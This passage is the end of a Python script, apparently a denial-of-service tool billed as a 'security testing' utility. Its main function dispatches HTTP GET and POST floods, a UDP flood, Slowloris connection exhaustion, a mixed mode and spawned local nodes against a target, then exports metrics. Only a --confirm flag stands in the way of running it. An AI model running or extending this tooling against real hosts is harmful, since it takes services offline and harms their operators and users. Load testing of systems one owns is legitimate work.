    p.add_argument("--custom-headers", type=str, help="Custom headers as JSON string, e.g. '{\"X-Custom\":\"value\"}'")
    return p.parse_args()

def main():
    args = parse_args()
    if not args.confirm:
        print("Safety check: add --confirm to actually run the attack simulation. Exiting.")
        sys.exit(0)

    global metrics
    metrics.reset()
    
    print_header(f"Enhanced Security Testing Tool - Mode: {args.mode.upper()}")

    # Parse custom headers
    custom_headers = None
    if args.custom_headers:
        try:
            custom_headers = json.loads(args.custom_headers)
        except json.JSONDecodeError:
            print(f"⚠️  Warning: Invalid JSON for custom headers: {args.custom_headers}")
            custom_headers = None

    # Build pattern config
    pattern_kwargs = {
        'rapid_delay': args.rapid_delay,
        'burst_size': args.burst_size,
        'burst_pause': args.burst_pause,
        'drip_delay': args.drip_delay
    }
    attack_style = args.attack_style

    # Route modes
    try:
        if args.mode == "http-get":
            pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
            asyncio.run(main_http_get(
                target=args.target, 
                concurrency=args.concurrency, 
                requests_per_worker=args.requests_per_worker, 
                pattern_cfg=pattern_cfg,
                custom_headers=custom_headers,
                show_progress=args.show_progress
            ))

        elif args.mode == "http-post":
            pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
            asyncio.run(main_http_post(
                target=args.target, 
                concurrency=args.concurrency, 
                requests_per_worker=args.requests_per_worker, 
                pattern_cfg=pattern_cfg, 
                payload_size=args.payload_size,
                custom_headers=custom_headers,
                show_progress=args.show_progress
            ))

        elif args.mode == "udp-flood":
            pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
            target_host = args.host
            print_header("UDP Flood")
            metrics.reset()
            t0 = time.time()
            succ, fail = asyncio.run(run_udp(
                target_host, args.port, args.concurrency, args.udp_packets_per_worker, 
                pattern_cfg, args.payload_size, args.show_progress
            ))
            elapsed = time.time() - t0
            print(f"\n✅ Completed in {elapsed:.2f}s")
            print(f"   Success: {succ:,} | Failed: {fail:,} | Total: {succ+fail:,}")

        elif args.mode == "slowloris":
            print_header("Slowloris Connection Exhaustion")
            metrics.reset()
            t0 = time.time()
            created, remaining = slowloris_worker_sync(
                args.host, args.port, args.sockets_per_worker, args.hold_time, args.send_interval
            )
            elapsed = time.time() - t0
            print(f"\n✅ Completed in {elapsed:.2f}s")
            print(f"   Created: {created} sockets | Remaining: {remaining} sockets")

        elif args.mode == "mixed":
            pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
            http_conc = max(1, args.concurrency // 2)
            post_conc = max(1, args.concurrency - http_conc)
            udp_conc = max(1, args.concurrency // 4)
            
            print_header("Mixed Mode Attack")
            metrics.reset()
            t0 = time.time()
            
            asyncio.run(run_mixed(
                target_http=args.target, http_conc=http_conc, http_reqs=args.requests_per_worker,
                post_conc=post_conc, post_reqs=args.requests_per_worker, post_payload=args.payload_size,
                udp_host=args.host, udp_port=args.port, udp_conc=udp_conc, 
                udp_pkts=args.udp_packets_per_worker, udp_payload=args.payload_size,
                attack_style=attack_style,
                custom_headers=custom_headers,
                show_progress=args.show_progress
            ))
            
            elapsed = time.time() - t0
            print(f"\n✅ Completed in {elapsed:.2f}s")

        elif args.mode == "spawn-nodes":
            kwargs = {
                'target': args.target,
                'concurrency': args.concurrency,
                'requests_per_worker': args.requests_per_worker,
                'delay': args.delay,
                'payload_size': args.payload_size,
                'host': args.host,
                'port': args.port,
                'packets_per_worker': args.udp_packets_per_worker,
                'udp_packets_per_worker': args.udp_packets_per_worker,
                'attack_style': attack_style,
                'burst_size': args.burst_size,
                'burst_pause': args.burst_pause,
                'rapid_delay': args.rapid_delay,
                'drip_delay': args.drip_delay,
                'custom_headers': custom_headers,
                'show_progress': args.show_progress
            }
            spawn_local_nodes(args.nodes, "mixed", kwargs)

        # Display analytics
        stats = metrics.get_statistics()
        if stats.get('total_requests', 0) > 0:
            print_statistics(stats)
            
            # Export if requested
            if args.export_json:
                metrics.export_to_json(args.export_json)
                print(f"💾 Analytics exported to: {args.export_json}")
            
            if args.export_csv:
                metrics.export_to_csv(args.export_csv)
                print(f"💾 Detailed metrics exported to: {args.export_csv}")

    except KeyboardInterrupt:
        print("\n\n⚠️  Interrupted by user")
        stats = metrics.get_statistics()
        if stats.get('total_requests', 0) > 0:
            print_statistics(stats)
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
